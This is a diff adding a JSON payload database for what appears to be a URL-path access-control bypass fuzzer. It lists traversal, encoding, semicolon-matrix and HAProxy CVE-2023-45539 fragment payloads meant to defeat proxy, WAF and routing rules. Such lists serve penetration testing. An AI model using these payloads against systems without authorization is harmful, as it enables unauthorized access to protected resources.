@@ -1,0 +1,59 @@
+{
+  "_comment": "Editable payload DB. Each entry: id (stable, for regex/allow-deny lists later), value (payload string, {{PATH}} is substituted with the target path), desc, requires_raw (true = must bypass net/http's URL normalization to survive on the wire), source (attribution).",
+
+  "end_paths": [
+    { "id": "trailing-slash",        "value": "{{PATH}}/",              "desc": "trailing slash normalization", "requires_raw": false },
+    { "id": "trailing-dot-slash",    "value": "{{PATH}}/.",             "desc": "dot-segment trailing", "requires_raw": false },
+    { "id": "trailing-space-enc",    "value": "{{PATH}}%20",            "desc": "encoded trailing space", "requires_raw": false },
+    { "id": "trailing-tab-enc",      "value": "{{PATH}}%09",            "desc": "encoded trailing tab", "requires_raw": false },
+    { "id": "trailing-dot",          "value": "{{PATH}}.",              "desc": "bare trailing dot", "requires_raw": false },
+    { "id": "trailing-questionmark", "value": "{{PATH}}?",              "desc": "empty query string", "requires_raw": false },
+    { "id": "trailing-hash-json",    "value": "{{PATH}}.json",          "desc": "extension confusion", "requires_raw": false },
+    { "id": "trailing-hash-html",    "value": "{{PATH}}.html",          "desc": "extension confusion", "requires_raw": false },
+    { "id": "trailing-semicolon",    "value": "{{PATH}};index.html",    "desc": "path param injection", "requires_raw": false },
+    { "id": "trailing-star",         "value": "{{PATH}}/*",             "desc": "wildcard suffix", "requires_raw": false },
+    { "id": "trailing-dotdot",       "value": "{{PATH}}/..",            "desc": "parent traversal, net normalization varies", "requires_raw": true },
+    { "id": "trailing-dotdot-null",  "value": "{{PATH}}/..%00",         "desc": "traversal + null byte", "requires_raw": true },
+    { "id": "trailing-dotdot-nl",    "value": "{{PATH}}/..%0a",         "desc": "traversal + encoded newline", "requires_raw": true },
+
+    { "id": "fragment-bare",         "value": "{{PATH}}#",              "desc": "HAProxy CVE-2023-45539: bare fragment, ACL sees stripped path", "requires_raw": false, "source": "CVE-2023-45539" },
+    { "id": "fragment-png",          "value": "{{PATH}}#.png",          "desc": "HAProxy CVE-2023-45539: defeats path_end .png/.css/.js rules", "requires_raw": false, "source": "CVE-2023-45539" },
+    { "id": "fragment-css",          "value": "{{PATH}}#.css",          "desc": "HAProxy CVE-2023-45539 path_end bypass", "requires_raw": false, "source": "CVE-2023-45539" },
+    { "id": "fragment-js",           "value": "{{PATH}}#.js",           "desc": "HAProxy CVE-2023-45539 path_end bypass", "requires_raw": false, "source": "CVE-2023-45539" },
+    { "id": "fragment-public",       "value": "{{PATH}}#public",        "desc": "HAProxy CVE-2023-45539: defeats path_beg public rules", "requires_raw": false, "source": "CVE-2023-45539" },
+    { "id": "fragment-traversal",    "value": "{{PATH}}#../file.txt",   "desc": "HAProxy CVE-2023-45539: fragment + traversal", "requires_raw": false, "source": "CVE-2023-45539" },
+    { "id": "fragment-double",       "value": "{{PATH}}#/#",            "desc": "HAProxy CVE-2023-45539: double fragment", "requires_raw": false, "source": "CVE-2023-45539" }
+  ],
+
+  "mid_paths": [
+    { "id": "double-slash-prefix",   "value": "//{{PATH_NOSLASH}}",              "desc": "leading double slash", "requires_raw": false },
+    { "id": "triple-slash-wrap",     "value": "///{{PATH_NOSLASH}}///",          "desc": "wrapped triple slash", "requires_raw": false },
+    { "id": "leading-dot",           "value": "/.{{PATH}}",                     "desc": "leading dot segment", "requires_raw": true },
+    { "id": "dot-segment-self",      "value": "/./{{PATH_NOSLASH}}",             "desc": "self-referencing dot segment", "requires_raw": true },
+    { "id": "semicolon-matrix",      "value": "/;/{{PATH_NOSLASH}}",             "desc": "matrix param injection (old Tomcat/Spring)", "requires_raw": true },
+    { "id": "semicolon-matrix-dot",  "value": "/.;/{{PATH_NOSLASH}}",            "desc": "matrix param + dot", "requires_raw": true },
+    { "id": "semicolon-matrix-2x",   "value": "//;//{{PATH_NOSLASH}}",           "desc": "matrix param, doubled slashes", "requires_raw": true },
+    { "id": "semicolon-suffix",      "value": "{{PATH}}..;/",                    "desc": "classic Tomcat/Spring semicolon bypass", "requires_raw": true },
+    { "id": "encoded-dot-segment",   "value": "/%2e{{PATH}}",                    "desc": "single-encoded dot segment", "requires_raw": true },
+    { "id": "double-encoded-dot",    "value": "/%252e{{PATH}}",                  "desc": "double-encoded dot (WAF decodes once, app decodes twice)", "requires_raw": true },
+    { "id": "encoded-slash-prefix",  "value": "/%2f{{PATH_NOSLASH}}",            "desc": "encoded leading slash", "requires_raw": true },
+    { "id": "encoded-slash-suffix",  "value": "{{PATH}}%2f",                     "desc": "encoded trailing slash", "requires_raw": true },
+    { "id": "reencoded-path",        "value": "/{{PATH_URLESCAPED}}",            "desc": "fully re-percent-encoded path", "requires_raw": true },
+    { "id": "mid-encoded-slash",     "value": "{{PATH_FIRSTSLASH_ENC}}",         "desc": "first internal slash percent-encoded", "requires_raw": true },
+    { "id": "mid-double-slash",      "value": "{{PATH_FIRSTSLASH_DBL}}",         "desc": "first internal slash doubled", "requires_raw": false },
+    { "id": "tilde-prefix",          "value": "/~{{PATH_NOSLASH}}",              "desc": "user-dir style prefix", "requires_raw": false },
+    { "id": "leading-dotdot",        "value": "/../{{PATH_NOSLASH}}",            "desc": "leading traversal", "requires_raw": true },
+    { "id": "upper-first-char",      "value": "{{PATH_CAP}}",                    "desc": "first path char uppercased (case-sensitive routing)", "requires_raw": false },
+    { "id": "upper-all",             "value": "/{{PATH_UPPER}}",                 "desc": "whole path uppercased", "requires_raw": false }
+  ],
+
+  "raw_encoding_strategies": [
+    { "id": "enc-last-char",     "desc": "percent-encode only the final character of the path", "requires_raw": true },
+    { "id": "enc-first-char",    "desc": "percent-encode only the first character of the last segment", "requires_raw": true },
+    { "id": "enc-last-segment",  "desc": "percent-encode every character in the final path segment", "requires_raw": true },
+    { "id": "enc-full-path",     "desc": "percent-encode every character in the full path", "requires_raw": true },
+    { "id": "enc-full-segment",  "desc": "percent-encode every character, segment by segment", "requires_raw": true },
+    { "id": "enc-depth-2",       "desc": "apply the above strategy twice (double encoding)", "requires_raw": true, "depth": 2 },
+    { "id": "enc-depth-3",       "desc": "apply the above strategy three times (triple encoding)", "requires_raw": true, "depth": 3 }
+  ]
+}
